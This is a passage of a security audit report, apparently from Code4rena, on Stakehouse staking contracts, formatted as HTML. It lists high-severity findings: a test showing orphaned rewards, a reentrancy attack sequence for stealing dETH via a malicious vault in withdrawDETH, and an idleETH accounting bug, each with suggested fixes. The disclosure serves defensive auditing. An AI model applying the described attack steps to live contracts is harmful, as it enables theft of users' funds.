 giantFeesAndMevPool.claimRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            feesAndMevUserTwo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            getAddressArrayFromValues(address(manager2.stakingFundsVault())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            blsPubKeyTwoInput);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(feesAndMevUserTwo.balance, 1 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // At this point, user 1 ought to have accumulated 1 ether from the rewards,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // however accumulated eth is listed as 0.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // The reason is that when the giant pool tokens were transferred to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // user two, the claimed[] value for user one was left unchanged.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            giantFeesAndMevPool.previewAccumulatedETH(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                feesAndMevUserOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new address[](0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new LPToken[][](0)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // The pool has received 4 eth rewards and paid out 3, but no users</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // are listed as having accumulated the eth. It is orphaned.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            giantFeesAndMevPool.previewAccumulatedETH(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                feesAndMevUserTwo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new address[](0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                new LPToken[][](0)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\\ No newline at end of file</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Reduce <code>claimed[]</code> when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[].</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-13-possible-reentrancy-and-fund-theft-in-withdrawdeth-of-giantsavethvaultpool-because-there-is-no-whitelist-check-for-user-provided-vaults-and-there-is-no-reentrancy-defense\" style=\"position:relative;\"><a href=\"#h-13-possible-reentrancy-and-fund-theft-in-withdrawdeth-of-giantsavethvaultpool-because-there-is-no-whitelist-check-for-user-provided-vaults-and-there-is-no-reentrancy-defense\" aria-label=\"h 13 possible reentrancy and fund theft in withdrawdeth of giantsavethvaultpool because there is no whitelist check for user provided vaults and there is no reentrancy defense permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226\">[H-13] Possible reentrancy and fund theft in <code>withdrawDETH()</code> of <code>GiantSavETHVaultPool</code> because there is no whitelist check for user provided Vaults and there is no reentrancy defense</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226\">unforgiven</a></em></p>\n<p>Function <code>withdrawDETH()</code> in <code>GiantSavETHVaultPool</code> allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. User can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>withdrawDETH()</code> in <code>GiantSavETHVaultPool</code>  code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _savETHVaults List of savETH vaults being interacted with</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function withdrawDETH(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] calldata _savETHVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] calldata _lpTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] calldata _amounts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 numOfVaults = _savETHVaults.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults &gt; 0, &quot;Empty arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _lpTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _amounts.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Firstly capture current dETH balance and see how much has been deposited after the loop</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; numOfVaults; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            SavETHVault vault = SavETHVault(_savETHVaults[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            for (uint256 j; j &lt; _lpTokens[i].length; ++j) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                LPToken token = _lpTokens[i][j];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                uint256 amount = _amounts[i][j];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(vault.isDETHReadyForWithdrawal(address(token)), &quot;dETH is not ready for withdrawal&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Giant LP is burned 1:1 with LPs from sub-networks</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(lpTokenETH.balanceOf(msg.sender) &gt;= amount, &quot;User does not own enough LP&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Burn giant LP from user before sending them dETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                lpTokenETH.burn(msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                emit LPBurnedForDETH(address(token), msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Ask</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vault.burnLPTokens(_lpTokens[i], _amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Calculate how much dETH has been received from burning</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Send giant LP holder dETH owed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see first contract save the dETH balance of contract by this line: <code>uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));</code> and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates <code>dETHReceivedFromAllSavETHVaults</code> and transfer those dETH to user: <code>getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);</code>. attacker can perform these steps:</p>\n<ol>\n<li>create a malicious contract <code>AttackerVault</code> which is copy of <code>SavETHVault</code> with modifiction.</li>\n<li>call <code>withdrawDETH()</code> with Vault list <code>[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]</code>.</li>\n<li>contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens.</li>\n<li>contract would reach Vault <code>AttackerVault</code> and call attacker controlled address.</li>\n<li>attacker contract call other functions to increase dETH balance of contract (if it’s not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always)</li>\n<li><code>withdrawDETH()</code> would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.</li>\n</ol>\n<p>Because contract don’t check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.</p>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check the provided addresses and also have some reentrancy defense mechanisim.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-14-fund-lose-in-function-bringunusedethbackintogiantpool-of-giantsavethvaultpool-eth-gets-back-to-giant-pool-but-the-value-of-idleeth-dont-increase\" style=\"position:relative;\"><a href=\"#h-14-fund-lose-in-function-bringunusedethbackintogiantpool-of-giantsavethvaultpool-eth-gets-back-to-giant-pool-but-the-value-of-idleeth-dont-increase\" aria-label=\"h 14 fund lose in function bringunusedethbackintogiantpool of giantsavethvaultpool eth gets back to giant pool but the value of idleeth dont increase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229\">[H-14] Fund lose in function <code>bringUnusedETHBackIntoGiantPool()</code> of <code>GiantSavETHVaultPool</code> ETH gets back to giant pool but the value of idleETH don’t increase</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25</a><br></p>\n<p>Variable <code>idleETH</code> in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of <code>idleETH</code> of contract, but in function <code>bringUnusedETHBackIntoGiantPool()</code> which brings unused ETH from savETH vault to giant pool the value of <code>idleETH</code> don’t get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>bringUnusedETHBackIntoGiantPool()</code> code in <code>GiantSavETHVaultPool()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _savETHVaults List of savETH vaults where ETH is staked</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _amounts Amounts of LP within the giant pool being burnt</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function bringUnusedETHBackIntoGiantPool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] calldata _savETHVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] calldata _lpTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] calldata _amounts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 numOfVaults = _savETHVaults.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults &gt; 0, &quot;Empty arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _lpTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _amounts.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; numOfVaults; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            SavETHVault vault = SavETHVault(_savETHVaults[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            for (uint256 j; j &lt; _lpTokens[i].length; ++j) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    &quot;ETH is either staked or derivatives minted&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vault.burnLPTokens(_lpTokens[i], _amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it checks that ETH is available in savETH vault and then calls to <code>burnLPTokens()</code> to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don’t increase the <code>idleETH</code> value so contract would lose tracking of real idle ETH balance of contract. because the vaule of <code>idleETH</code> is used when withdrawing or depositing into savETH vaults so the contract can’t reuse the returned ETH. these are the steps that cause this bug to happen:</p>\n<ol>\n<li>giant pool has 100 <code>idleETH</code>.</li>\n<li>with function <code>batchDepositETHForStaking()</code> users stake 80 <code>ETH</code> and the new value of <code>idleETH</code> would be <code>20</code> and contract LP Token balance increase by 80.</li>\n<li>the 80 newly staked ETH is not yet staked in <code>stakehouse</code>.</li>\n<li>with function <code>bringUnusedETHBackIntoGiantPool()</code> users bring back those 80 <code>ETH</code> from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because <code>idleETH</code> value don’t get increase it still would show <code>20</code>.</li>\n<li>the extra 80 ETH would returned to giant pool wouldn’t be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of <code>idleETH</code> has been used to know the amount of idle ETH in giant pool and because the value doesn’t show the correct amount so the extra amount of ETH wouldn’t be lost.</li>\n</ol>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Contract should correctly update value of <code>idleETH</code> in different actions because withdraw and deposit logics depend on it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-15-user-loses-remaining-rewards-in-giantmevandfeespool-when-new-deposits-happen-because-_ondepositeth-set-claimed-to-max-without-transferring-user-remaining-rewards\" style=\"position:relative;\"><a href=\"#h-15-user-loses-remaining-rewards-in-giantmevandfeespool-when-new-deposits-happen-because-_ondepositeth-set-claimed-to-max-without-transferring-user-remaining-rewards\" aria-label=\"h 15 user loses remaining rewards in giantmevandfeespool when new deposits happen because _ondepositeth set claimed to max without transferring user remaining rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240\">[H-15] User loses remaining rewards in <code>GiantMevAndFeesPool</code> when new deposits happen because <code>_onDepositETH()</code> set <code>claimed[][]</code> to max without transferring user remaining rewards</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204</a><br>\n<a 